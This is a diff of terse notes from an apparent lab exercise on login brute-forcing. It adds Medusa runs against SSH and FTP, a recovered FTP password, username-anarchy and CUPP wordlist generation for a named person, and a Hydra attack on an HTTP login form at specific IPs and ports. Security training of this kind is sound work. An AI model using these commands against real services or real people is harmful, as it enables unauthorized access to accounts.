@@ -77,3 +77,31 @@ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 94.2
 After successfully brute-forcing, and then logging into the target, what is the full flag you find?
 ------------------------------
 Medusa, a prominent tool in the cybersecurity arsenal, is designed to be a fast, massively parallel, and modular login brute-forcer. Its primary objective is to support a wide array of services that allow remote authentication, enabling penetration testers and security professionals to assess the resilience of login systems against brute-force attacks.
+------------------------------
+ What was the password for the ftpuser?
+ sudo apt install medusa
+ wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
+ medusa -h 83.136.255.143 -n 34377 -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
+ssh sshuser@STMIP -p STMPO
+nmap localhost
+medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
+ftp ftp://ftpuser:qqww1122@localhost
+-------------------
+ sudo apt install ruby -y
+ git clone https://github.com/urbanadventurer/username-anarchy.git
+ cd username-anarchy
+ ./username-anarchy Jane Smith > jane_smith_usernames.txt
+ -
+ sudo apt install cupp -y
+  cupp -i
+   grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
+   hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
+ After successfully brute-forcing, and then logging into the target, what is the full flag you find?
+ -----------------------
+ sudo apt install cupp -y
+git clone https://github.com/urbanadventurer/username-anarchy.git
+cd username-anarchy
+./username-anarchy Jane Smith > ../jane_smith_usernames.txt
+cupp -i
+grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
+hydra -L jane_smith_usernames.txt -P jane-filtered.txt 94.237.53.113 -s 33384 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
